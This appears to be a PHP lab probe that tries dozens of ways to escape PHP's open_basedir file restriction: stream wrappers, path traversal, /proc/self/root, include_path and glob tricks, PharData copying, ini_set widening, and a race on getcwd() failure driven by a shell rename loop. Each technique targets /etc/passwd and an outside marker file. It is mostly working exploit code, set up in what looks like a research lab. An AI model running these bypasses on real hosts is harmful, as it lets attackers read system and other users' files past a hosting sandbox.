<?php
/**
 * open_basedir probe. Jail is LABROOT/findings/basedir/jail (set by -d).
 * Prints HIT only when bytes or a directory listing from outside the jail come back.
 */
error_reporting(E_ALL);
set_error_handler(static function () { return true; });

$jail = 'LABROOT/findings/basedir/jail';
$outside = 'LABROOT/findings/basedir/OUTSIDE.txt';
$marker = 'BASEDIR-OUTSIDE-MARKER-7f3a';
$passwd = '/etc/passwd';

function show($label, $data) {
    global $jail, $marker;
    if ($data === false || $data === null || $data === '') {
        echo "MISS $label\n";
        return false;
    }
    if (is_array($data)) {
        $out = [];
        foreach ($data as $item) {
            $s = (string) $item;
            if ($s === '' || $s === '.' || $s === '..') {
                continue;
            }
            $full = $s;
            if ($full[0] !== '/') {
                $full = getcwd() . '/' . $s;
            }
            $real = @realpath($full);
            $cmp = $real !== false ? $real : $full;
            if (str_starts_with($cmp, $jail . '/') || $cmp === $jail) {
                continue;
            }
            $out[] = $s;
        }
        if (!$out) {
            echo "MISS $label\n";
            return false;
        }
        echo "HIT $label LIST " . implode(',', array_slice($out, 0, 40)) . "\n";
        return true;
    }
    $s = (string) $data;
    if (str_contains($s, 'root:') || str_contains($s, $marker) || str_contains($s, 'BASEDIR-OUTSIDE-PHP-MARKER')) {
        echo "HIT $label BYTES " . substr($s, 0, 180) . "\n";
        return true;
    }
    echo "MISS $label got=" . substr(str_replace(["\n", "\r"], ' ', $s), 0, 120) . "\n";
    return false;
}

echo "PHP " . PHP_VERSION . " zts=" . ((defined('ZEND_THREAD_SAFE') && ZEND_THREAD_SAFE) ? '1' : '0') . "\n";
echo "BASEDIR " . ini_get('open_basedir') . "\n";
echo "CWD0 " . getcwd() . "\n";

$inside = @file_get_contents($jail . '/inside.txt');
echo ($inside !== false && str_contains($inside, 'INSIDE-OK')) ? "CONTROL inside-ok\n" : "CONTROL inside-FAIL\n";

$paths = [
    'abs-passwd' => $passwd,
    'abs-outside' => $outside,
    'file-passwd' => 'file:///etc/passwd',
    'file-localhost' => 'file://localhost/etc/passwd',
    'file-4slash' => 'file:////etc/passwd',
    'filter' => 'php://filter/read=convert.base64-encode/resource=/etc/passwd',
    'filter-outside' => 'php://filter/resource=' . $outside,
    'zlib' => 'compress.zlib:///etc/passwd',
    'zlib-short' => 'zlib:/etc/passwd',
    'concat-dotdot' => $jail . '/../OUTSIDE.txt',
    'concat-nested' => $jail . '/nope/../../OUTSIDE.txt',
    'concat-mid' => $jail . '/missing/../../../etc/passwd',
    'proc-root' => '/proc/self/root/etc/passwd',
    'proc-cwd' => '/proc/self/cwd/findings/basedir/OUTSIDE.txt',
];
foreach ($paths as $name => $path) {
    show($name, @file_get_contents($path));
}

show('readfile-buf', (static function () use ($passwd) {
    ob_start();
    $ok = @readfile($passwd);
    $buf = ob_get_clean();
    return $ok === false ? false : $buf;
})());
show('file-func', @file($passwd) === false ? false : implode('', (array) @file($passwd)));
show('highlight', (static function () use ($outside) {
    ob_start();
    $ok = @highlight_file($outside, true);
    $buf = ob_get_clean();
    if (is_string($ok) && $ok !== '') {
        return $ok;
    }
    return $buf !== '' ? $buf : false;
})());
show('strip', @php_strip_whitespace($outside));
show('copy-out', (static function () use ($passwd, $jail) {
    $dest = $jail . '/loot-passwd';
    @unlink($dest);
    if (!@copy($passwd, $dest)) {
        return false;
    }
    return @file_get_contents($dest);
})());
show('include-php', (static function () {
    ob_start();
    $ok = @include 'LABROOT/findings/basedir/OUTSIDE.php';
    $buf = ob_get_clean();
    return $buf !== '' ? $buf : false;
})());

@ini_set('include_path', '/etc' . PATH_SEPARATOR . 'LABROOT/findings/basedir');
show('include-path-fgc', @file_get_contents('passwd', true));
show('include-path-outside', @file_get_contents('OUTSIDE.txt', true));
$resolved = @stream_resolve_include_path('passwd');
echo "resolve-include " . ($resolved === false ? 'false' : $resolved) . "\n";

show('gzfile', (static function () use ($passwd) {
    $a = @gzfile($passwd);
    return $a === false ? false : implode('', $a);
})());
show('readgzfile', (static function () use ($passwd) {
    ob_start();
    $n = @readgzfile($passwd);
    $buf = ob_get_clean();
    return $n ? $buf : false;
})());
$gz = @gzopen($passwd, 'r');
if ($gz) {
    show('gzopen', @gzread($gz, 200));
    @gzclose($gz);
} else {
    echo "MISS gzopen\n";
}

foreach (['/etc', '/etc/*', '/*', $jail . '/..', $jail . '/../*', 'LABROOT/findings/basedir/*'] as $pat) {
    $g = @glob($pat);
    show('glob ' . $pat, $g === false ? false : $g);
}
$g = @glob('/etc/passwd', GLOB_NOSORT | GLOB_NOCHECK);
show('glob-nocheck', $g === false ? false : $g);
if (defined('GLOB_BRACE')) {
    $g = @glob('{/etc/passwd,/etc/hostname}', GLOB_BRACE);
    show('glob-brace', $g === false ? false : $g);
}

foreach (['/etc', 'glob:///etc/*', 'glob:///*', $jail . '/..', 'LABROOT/findings/basedir'] as $dir) {
    $list = [];
    $h = @opendir($dir);
    if ($h) {
        while (($e = readdir($h)) !== false) {
            $list[] = $dir . '/' . $e;
        }
        closedir($h);
    }
    show('opendir ' . $dir, $h ? $list : false);
}
if (class_exists('DirectoryIterator')) {
    try {
        $list = [];
        foreach (new DirectoryIterator('/etc') as $info) {
            $list[] = $info->getFilename();
        }
        show('DirectoryIterator', $list);
    } catch (Throwable $e) {
        echo "MISS DirectoryIterator " . $e->getMessage() . "\n";
    }
}
if (class_exists('GlobIterator')) {
    try {
        $list = [];
        foreach (new GlobIterator('glob:///etc/*') as $info) {
            $list[] = $info->getPathname();
        }
        show('GlobIterator', $list);
    } catch (Throwable $e) {
        echo "MISS GlobIterator " . $e->getMessage() . "\n";
    }
}
show('scandir-etc', @scandir('/etc'));
show('scandir-parent', @scandir('LABROOT/findings/basedir'));

if (class_exists('SplFileInfo')) {
    $info = new SplFileInfo($passwd);
    $rp = @$info->getRealPath();
    echo "spl-realpath " . ($rp === false ? 'false' : $rp) . "\n";
    try {
        echo "spl-open " . (show('spl-open', $info->openFile('r')->fread(80)) ? '' : '');
    } catch (Throwable $e) {
        echo "MISS spl-open " . $e->getMessage() . "\n";
    }
    if (is_link($jail . '/passwd-link') || file_exists($jail . '/passwd-link')) {
        $li = new SplFileInfo($jail . '/passwd-link');
        echo "spl-linktarget " . (string) @$li->getLinkTarget() . "\n";
        show('spl-link-open', @file_get_contents($jail . '/passwd-link'));
    } else {
        echo "MISS symlink-absent\n";
    }
}
show('realpath-func', @realpath($passwd));

if (class_exists('PharData')) {
    $tar = $jail . '/t.tar';
    @unlink($tar);
    try {
        $p = new PharData($tar);
        $p->addFile($passwd, 'p');
        $bytes = @file_get_contents('phar://' . $tar . '/p');
        show('phar-addFile', $bytes);
    } catch (Throwable $e) {
        echo "MISS phar-addFile " . $e->getMessage() . "\n";
    }
    try {
        $p = new PharData($tar);
        $p->addFile('file:///etc/passwd', 'p2');
        show('phar-addFile-fileurl', @file_get_contents('phar://' . $tar . '/p2'));
    } catch (Throwable $e) {
        echo "MISS phar-addFile-fileurl " . $e->getMessage() . "\n";
    }
    try {
        $p = new PharData($tar);
        $p->addFile('compress.zlib:///etc/passwd', 'p3');
        show('phar-addFile-zlib', @file_get_contents('phar://' . $tar . '/p3'));
    } catch (Throwable $e) {
        echo "MISS phar-addFile-zlib " . $e->getMessage() . "\n";
    }
    try {
        $p = new PharData($tar);
        $p->addFile('php://filter/resource=/etc/passwd', 'p4');
        show('phar-addFile-filter', @file_get_contents('phar://' . $tar . '/p4'));
    } catch (Throwable $e) {
        echo "MISS phar-addFile-filter " . $e->getMessage() . "\n";
    }
} else {
    echo "MISS phar-absent\n";
}

echo "cache-size-before " . ini_get('realpath_cache_size') . " used " . realpath_cache_size() . "\n";
$rc = @ini_set('realpath_cache_size', '4096K');
echo "cache-size-set " . var_export($rc, true) . " now " . ini_get('realpath_cache_size') . "\n";

$orig = ini_get('open_basedir');
@chdir($jail);
$staticTry = [
    'empty' => '',
    'slash' => '/',
    'dot' => '.',
    'dotdot' => '..',
    'trail-colon' => $jail . ':',
    'colon-jail' => ':' . $jail,
    'parent' => $jail . '/..',
    'parent-rel' => '..',
    'dot-comp' => $jail . '/.',
    'double' => $jail . ':' . $jail . '/..',
];
foreach ($staticTry as $name => $val) {
    @ini_set('open_basedir', $val);
    $now = ini_get('open_basedir');
    $widened = ($now !== $orig) && $now !== false && $now !== '';
    echo "ini-static $name retbasedir=$now\n";
    if ($widened && $now !== $orig) {
        show('ini-static-read-' . $name, @file_get_contents($passwd));
        show('ini-static-out-' . $name, @file_get_contents($outside));
    }
    @ini_set('open_basedir', $orig);
}
echo "ini-restored " . ini_get('open_basedir') . "\n";

@ini_set('disable_functions', '');
echo "disable_functions [" . ini_get('disable_functions') . "]\n";

// --- getcwd() failure race: GH #21961, fallback still present ---
$leafRel = str_repeat(str_repeat('a', 249) . '/', 16);
$leafRel = rtrim($leafRel, '/');
@chdir($jail);
$longName = str_repeat('x', 250);
$longPath = $jail . '/' . $longName;
if (is_dir($longPath)) {
    if (is_dir($jail . '/poc')) {
        @rmdir($jail . '/poc');
    }
    if (!is_dir($jail . '/poc')) {
        @rename($longPath, $jail . '/poc');
    }
}
if (!is_dir($jail . '/poc')) {
    @mkdir($jail . '/poc', 0777);
}
@chdir($jail . '/poc');
if (!@chdir($leafRel)) {
    echo "RACE mkdir-chdir FAIL cwd=" . getcwd() . "\n";
    exit(0);
}
echo "RACE leaf len=" . strlen((string) getcwd()) . "\n";

$long = str_repeat('x', 250);
$sh = 'j=' . escapeshellarg($jail) . '; long=' . escapeshellarg($long) . '; i=0; while [ "$i" -lt 200000 ]; do mv "$j/poc" "$j/$long" 2>/dev/null; mv "$j/$long" "$j/poc" 2>/dev/null; i=$((i+1)); done';
$proc = @proc_open(
    ['/bin/sh', '-c', $sh],
    [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']],
    $pipes,
    $jail
);
if (!is_resource($proc)) {
    $e = error_get_last();
    echo "RACE proc_open FAIL " . ($e['message'] ?? '') . "\n";
    exit(0);
}
foreach ($pipes as $p) {
    @fclose($p);
}

$want = $orig . ':../';
$hit = false;
$tries = 0;
$sawFail = 0;
$enforced = '';
$t0 = microtime(true);
restore_error_handler();
set_error_handler(static function ($no, $str) use (&$enforced) {
    if (preg_match('/allowed path\\(s\\): \\((.*)\\)\\s*$/s', $str, $m)) {
        $enforced = $m[1];
    }
    return true;
});
while ((microtime(true) - $t0) < 40.0) {
    if (getcwd() !== false) {
        continue;
    }
    $sawFail++;
    $tries++;
    @ini_set('open_basedir', $want);
    $enforced = '';
    @file_get_contents('/etc/passwd');
    if ($enforced !== '' && str_contains($enforced, '..')) {
        $hit = true;
        echo "RACE inject enforced=" . str_replace("\n", ' ', substr($enforced, 0, 200)) . " tries=$tries sawFail=$sawFail\n";
        break;
    }
}
if (!$hit) {
    $show = $enforced;
    if (strlen($show) > 180) {
        $show = substr($show, 0, 80) . '...len=' . strlen($enforced);
    }
    echo "RACE no-inject tries=$tries sawFail=$sawFail elapsed=" . round(microtime(true) - $t0, 2) . " enforced=$show\n";
}
@proc_terminate($proc);
@proc_close($proc);
@rename($jail . '/' . $long, $jail . '/poc');

for ($i = 0; $i < 500 && getcwd() === false; $i++) {
    usleep(2000);
    @rename($jail . '/' . $long, $jail . '/poc');
}
@chdir($jail);
$climbed = 0;
$cwds = [];
for ($i = 0; $i < 25; $i++) {
    if (!@chdir('..')) {
        break;
    }
    $climbed++;
    $cwds[] = (string) getcwd();
}
echo "CLIMB n=$climbed cwd=" . getcwd() . "\n";
show('race-passwd', @file_get_contents($passwd));
show('race-outside', @file_get_contents($outside));
show('race-rel-passwd', @file_get_contents('etc/passwd'));
show('race-include', (static function () {
    ob_start();
    @include 'LABROOT/findings/basedir/OUTSIDE.php';
    $buf = ob_get_clean();
    return $buf !== '' ? $buf : false;
})());
echo "END ini=" . ini_get('open_basedir') . "\n";
